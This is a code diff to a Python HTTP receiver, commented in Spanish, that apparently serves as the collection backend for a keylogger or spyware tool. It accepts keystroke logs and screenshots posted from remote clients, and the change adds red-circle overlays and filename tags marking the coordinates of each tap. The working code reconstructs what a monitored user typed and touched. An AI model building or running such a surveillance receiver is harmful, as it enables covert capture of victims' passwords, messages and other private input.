@@ -22,7 +22,15 @@ import sys
 import threading
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from io import BytesIO
 from pathlib import Path
+from urllib.parse import urlparse, parse_qs
+
+try:
+    from PIL import Image, ImageDraw
+    PIL_OK = True
+except ImportError:
+    PIL_OK = False
 
 OUTDIR = Path(".")
 CSV_NAME = "keystrokes.csv"
@@ -43,15 +51,42 @@ def shots_dir() -> Path:
     return d
 
 
-def save_screenshot(blob: bytes) -> Path:
-    """Guarda PNG en screenshot/shot_<ts>_<n>.png. Devuelve la ruta."""
+def draw_tap_overlay(png_blob: bytes, x: int, y: int) -> bytes:
+    """Dibuja un circulo rojo translucido en (x,y) sobre el PNG."""
+    if not PIL_OK:
+        print("[recv] WARN: Pillow no instalado, no dibujo el punto. pip install Pillow")
+        return png_blob
+    try:
+        img = Image.open(BytesIO(png_blob)).convert("RGBA")
+        overlay = Image.new("RGBA", img.size, (0, 0, 0, 0))
+        d = ImageDraw.Draw(overlay)
+        r = max(40, int(min(img.size) * 0.025))   # ~2.5% del lado menor
+        d.ellipse([x - r, y - r, x + r, y + r],
+                  fill=(255, 0, 0, 110),
+                  outline=(255, 0, 0, 255),
+                  width=6)
+        img = Image.alpha_composite(img, overlay)
+        out = BytesIO()
+        img.convert("RGB").save(out, format="PNG")
+        return out.getvalue()
+    except Exception as e:
+        print(f"[recv] WARN: overlay fallo ({e}), guardando original")
+        return png_blob
+
+
+def save_screenshot(blob: bytes, tap_x: int = -1, tap_y: int = -1) -> Path:
+    """Guarda PNG en screenshot/. Si llega tap, dibuja circulo rojo en (x,y)."""
     global SHOT_COUNT
     import time as _t
+    is_tap = tap_x >= 0 and tap_y >= 0
+    if is_tap:
+        blob = draw_tap_overlay(blob, tap_x, tap_y)
     with SHOT_LOCK:
         n = SHOT_COUNT
         SHOT_COUNT += 1
     ext = ".png" if blob.startswith(b"\x89PNG") else ".bin"
-    fname = shots_dir() / f"shot_{int(_t.time())}_{n:05d}{ext}"
+    suffix = f"_tap_{tap_x}_{tap_y}" if is_tap else ""
+    fname = shots_dir() / f"shot_{int(_t.time())}_{n:05d}{suffix}{ext}"
     fname.write_bytes(blob)
     return fname
 
@@ -102,8 +137,9 @@ class Handler(BaseHTTPRequestHandler):
         global KEY_COUNT
         length = int(self.headers.get("Content-Length") or 0)
         raw = self.rfile.read(length) if length else b""
+        parsed = urlparse(self.path)
 
-        if self.path.startswith("/keys"):
+        if parsed.path.startswith("/keys"):
             try:
                 payload = json.loads(raw.decode("utf-8"))
             except Exception as e:
@@ -117,9 +153,13 @@ class Handler(BaseHTTPRequestHandler):
             self._send(204)
             return
 
-        if self.path.startswith("/upload"):
-            fname = save_screenshot(raw)
-            print(f"[recv] {self.client_address[0]} POST /upload "
+        if parsed.path.startswith("/upload"):
+            qs = parse_qs(parsed.query)
+            tap_x = int(qs["x"][0]) if "x" in qs else -1
+            tap_y = int(qs["y"][0]) if "y" in qs else -1
+            fname = save_screenshot(raw, tap_x, tap_y)
+            tag = f" TAP({tap_x},{tap_y})" if tap_x >= 0 else ""
+            print(f"[recv] {self.client_address[0]} POST /upload{tag} "
                   f"({len(raw)//1024} KiB) -> {fname.name}  total={SHOT_COUNT}")
             self._send(204)
             return
